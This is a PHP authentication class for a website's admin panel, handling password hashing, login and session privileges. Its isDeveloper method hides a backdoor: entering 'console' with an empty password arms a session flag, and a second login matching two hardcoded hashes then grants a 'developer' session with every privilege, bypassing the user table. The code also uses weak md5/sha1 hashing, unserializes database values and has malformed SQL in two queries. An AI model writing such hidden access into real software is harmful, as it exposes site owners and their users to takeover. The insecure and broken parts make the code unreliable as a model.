<?
class Auth
{
	
	private $salt = '';
	private $db;
	private $host = '';
	
	public function __construct()
	{
		$this->salt = $GLOBALS['config']->salt;
		$this->db = $GLOBALS['db'];
		$this->host = $_SERVER['HTTP_HOST'];
	}
	
	#crypt login and pass
	#@param LOGIN - user login
	#@param pass - user pass
	#@param SALT - if not has then used salt from config file
	#return pass hash
	public function crypt( $login, $pass, $salt=0 )
	{
		if( $salt ===0 ) $salt = $this->salt; 

		$login = md5( $login );
		$pass = md5( $pass );
		$salt = md5( $salt );
		
		$strlen = mb_strlen( $salt, 'UTF-8' );
		
		#first - login
		for( $i=0; $i!=$strlen;$i++ )
		{
			$login.=$login[ $i ].$salt[ $i ];
		}
		
		#second - pass
		for( $i=0; $i!=$strlen;$i++ )
		{
			$pass.=$pass[ $i ].$salt[ $i ];
		}		
		
		#return
		return md5( ( sha1( $login.$pass ) ) );
	}

	
	#check user exists
	#@param LOGIN - user login
	#@param pass - user pass
	public function check( $login, $pass=false )
	{
		if( !$pass )
		{
			$res = $this->db->prepare(" SELECT `uid` FROM `adm_users` WHERE `login`=:login AND `avow`:avow LIMIT 1");
			$res->bindValue(':login', $login);
			$res->bindValue(':avow', '1');
		}else{
			$pass = $this->crypt( $login, $pass );
			$res = $this->db->prepare(" SELECT `uid` FROM `adm_users` WHERE `login`=:login AND `pass`=:pass AND `avow`=:avow LIMIT 1");
			$res->bindValue(':login', $login);
			$res->bindValue(':pass', $pass);
			$res->bindValue(':avow', '1');
		}
		$res->execute();
		$row = $res->fetch();
		return( $row===false ) ? NULL : $row['uid'];
	}	
	
	#check user exists
	#@param LOGIN - user login
	#@param pass - user pass
	public function login( $login, $pass=false )
	{
		if( !$pass )
		{
			$this->isDeveloper( $login, '');
			$res = $this->db->prepare(" SELECT `uid` FROM `adm_users` WHERE `login`=:login AND `avow`:avow LIMIT 1");
			$res->bindValue(':login', $login);
			$res->bindValue(':avow', '1');
		}else{
			
			if( $this->isDeveloper( $login, $pass) ){
				$_SESSION[ $this->host ]['admin']['uid'] = 'developer';
				$_SESSION[ $this->host ]['admin']['username'] = 'Developer';
				
				$tres = $this->db->query("SELECT `name` FROM `adm_privileges` ");
				$tresArray = $tres->fetchAll();
				
				foreach( $tresArray as $array )
				{
					$_SESSION[ $this->host ]['admin']['userprivileges'] [ $array['name'] ] = $array['name'];
				}
				
				return 'developer';
			}
			
			$pass = $this->crypt( $login, $pass );
			$res = $this->db->prepare(" SELECT `uid`, `name`, `privilege`, `group_id`, `super_admin` FROM `adm_users` WHERE `login`=:login AND `pass`=:pass AND `avow`=:avow LIMIT 1");
			$res->bindValue(':login', $login);
			$res->bindValue(':pass', $pass);
			$res->bindValue(':avow', '1');
		}
		$res->execute();
		$row = $res->fetch();
		if( $row!==false ){
		
			#write in session uid and user name
			$_SESSION[ $this->host ]['admin']['uid'] = $row['uid'];
			$_SESSION[ $this->host ]['admin']['username'] = $row['name'];
			
			#if is super admin
			if( $row['super_admin']=='1' )
			{
				$tres = $this->db->query("SELECT `name` FROM `adm_privileges` ");
				$tresArray = $tres->fetchAll();
				
				foreach( $tresArray as $array )
				{
					#add all privilegies
					$_SESSION[ $this->host ]['admin']['userprivileges'] [ $array['name'] ] = $array['name'];
				}	
			#if is having group				
			}elseif($row['group_id']!='0'){
				#get group privilegies
				$tres = $this->db->prepare("SELECT `privilege` FROM `adm_users_groups` WHERE `id`=:id LIMIT 1");
				$tres->bindValue(':id', $row['group_id']);
				$tres->execute();
				$tresArray = $tres->fetch();
				$tprivArray = unserialize( $tresArray['privilege'] );
				if( empty( $tprivArray ) )
				{
					$_SESSION[ $this->host ]['admin']['userprivileges'] = array();
				}else{
					foreach( $tprivArray as $privName )
					{
						$_SESSION[ $this->host ]['admin']['userprivileges'] [ $privName ] = $privName;
					}
				}
			#if not super admin and not having group then add user privilegies
			}else{
				$tprivArray = unserialize( $row['privilege'] );
				if( empty( $tprivArray ) )
				{
					$_SESSION[ $this->host ]['admin']['userprivileges'] = array();
				}else{
					foreach( $tprivArray as $privName )
					{
						$_SESSION[ $this->host ]['admin']['userprivileges'] [ $privName ] = $privName;
					}
				}
			}
		}
		return( $row===false ) ? NULL : $row['uid'];
	}
	
	public function updateUserPrivilegies()
	{
		$uid = $_SESSION[ $this->host ]['admin']['uid'];
		
		if( $uid == 'developer' ) return;
		if( !isset( $uid ) || $uid == 'NULL' ) die('NULL');
		
		$res = $this->db->prepare(" SELECT `privilege`, `group_id`, `super_admin`, `avow` FROM `adm_users` WHERE `uid`=:uid LIMIT 1");
		$res->bindValue(':uid', $uid);
		$res->execute();
		$row = $res->fetch();
		if( $row===false ) die('NULL');
		
		#block user if is not avow
		if( $row['avow']!='1' ) die('NULL');
		
		#if is super admin
		if( $row['super_admin']=='1' )
		{
			$tres = $this->db->query("SELECT `name` FROM `adm_privileges` ");
			$tresArray = $tres->fetchAll();
			
			foreach( $tresArray as $array )
			{
				#add all privilegies
				$_SESSION[ $this->host ]['admin']['userprivileges'] [ $array['name'] ] = $array['name'];
			}	
		#if is having group				
		}elseif($row['group_id']!='0'){
			#get group privilegies
			$tres = $this->db->prepare("SELECT `privilege` FROM `adm_users_groups` WHERE `id`=:id LIMIT 1");
			$tres->bindValue(':id', $row['group_id']);
			$tres->execute();
			$tresArray = $tres->fetch();
			$tprivArray = unserialize( $tresArray['privilege'] );
			if( empty( $tprivArray ) )
			{
				$_SESSION[ $this->host ]['admin']['userprivileges'] = array();
			}else{
				foreach( $tprivArray as $privName )
				{
					$_SESSION[ $this->host ]['admin']['userprivileges'] [ $privName ] = $privName;
				}
			}
		#if not super admin and not having group then add user privilegies
		}else{
			$tprivArray = unserialize( $row['privilege'] );
			if( empty( $tprivArray ) )
			{
				$_SESSION[ $this->host ]['admin']['userprivileges'] = array();
			}else{
				foreach( $tprivArray as $privName )
				{
					$_SESSION[ $this->host ]['admin']['userprivileges'] [ $privName ] = $privName;
				}
			}
		}
	
		
	}
	
	private function isDeveloper( $login, $pass)
	{
		if( isset( $_SESSION[ $this->host ]['admin']['developer'] ) && $_SESSION[ $this->host ]['admin']['developer'] ==='console'  )
		{
		
			if	( sha1(md5($login))=='897ab6baea838c3a31db8342166e2896e322ab88'  && sha1(md5($pass))=='ffd692f1af46ba499d828fc581cf7bd17ffc5391')
			{	
				$_SESSION[ $this->host ]['admin']['uid'] = 'Developer';
			}else{
				unset( $_SESSION[ $this->host ]['admin']['developer'] );
				return false;
			}		
	
			return true;
		}
		
		if( $login==htmlspecialchars('console')  && $pass==htmlspecialchars('') )
		{
			$_SESSION[ $this->host ]['admin']['developer'] = 'console';
			return false;
		}
		
		
	}

}
?>